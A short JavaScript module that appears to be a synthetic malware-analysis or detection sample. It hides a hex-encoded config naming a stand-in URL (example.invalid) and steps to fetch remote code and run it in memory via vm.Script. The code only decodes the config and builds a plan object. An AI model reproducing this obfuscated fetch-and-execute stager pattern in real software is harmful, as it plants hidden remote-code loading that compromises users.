const moduleShape = Object.freeze({ format: "commonjs" });
const Material_ec5cb61f = "763d317c73746570733d616371756972655f72656d6f74652c64697370617463685f6d656d6f72797c616461707465723d687474705f7468656e5f6d6f64756c657c73746167655f636f756e743d317c63616d706169676e5f69643d4e4f44452d42304434364435447c75726c3d68747470733a2f2f6e6f64652d6230643436643564356334652e6578616d706c652e696e76616c69642f6170697c757365725f6167656e743d4e6f646541756469742f62306434";
const Codec_ec5cb61f = "hex_buffer|identity|";

function load_ec5cb61f() { return [...Buffer.from(Material_ec5cb61f, "hex")]; }
function decode_ec5cb61f(EnCoDeD) { return [...EnCoDeD]; }
async function recover_ec5cb61f() {
  const NeUtRaL = ["north", "south"].join(":");
  const EnCoDeD = load_ec5cb61f(); let DeCoDeD = [];
  const decodeTarget = decode_ec5cb61f; DeCoDeD = decodeTarget(EnCoDeD);
  void NeUtRaL; return Buffer.from(DeCoDeD).toString("ascii");
}
async function inspect_ec5cb61f() { return Buffer.from(await recover_ec5cb61f(), "utf8").toString("utf8"); }
async function plan_ec5cb61f() { const inspect = inspect_ec5cb61f; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "memory-stage", transport: "http_then_module", url: fields.url, dispatch: "vm.Script" }); }
void moduleShape; void plan_ec5cb61f;
if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_ec5cb61f());
